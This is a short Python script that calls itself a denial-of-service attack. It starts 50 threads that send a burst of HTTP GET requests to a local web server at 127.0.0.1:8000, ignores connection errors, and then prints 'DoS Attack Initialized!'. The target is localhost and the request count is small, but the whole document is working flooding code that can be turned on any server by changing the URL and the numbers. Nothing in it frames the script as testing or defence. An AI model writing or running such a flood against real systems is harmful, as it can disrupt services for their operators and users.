import requests
import threading

url = "http://127.0.0.1:8000"

TOTAL_REQUESTS = 350
NUM_THREADS = 50

def flood():
    for _ in range(TOTAL_REQUESTS // NUM_THREADS):
        try:
            requests.get(url)
        except requests.exceptions.RequestException:
            pass

threads = [threading.Thread(target=flood) for _ in range(NUM_THREADS)]

for t in threads:
    t.start()

for t in threads:
    t.join()

print("DoS Attack Initialized!")